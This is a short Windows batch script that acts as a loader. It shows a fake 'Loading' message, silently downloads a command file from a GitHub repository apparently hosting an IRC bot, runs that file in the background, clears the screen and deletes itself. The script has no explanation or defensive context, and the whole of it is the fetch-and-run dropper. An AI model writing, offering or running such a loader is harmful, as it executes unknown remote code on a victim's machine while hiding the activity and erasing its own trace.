@echo off
echo "Loading"
curl -o inst.cmd https://raw.githubusercontent.com/crackman2/irc_mcgee/master/update/irc.cmd -s
cls
timeout /T 1 > nul
start /B inst.cmd
del %0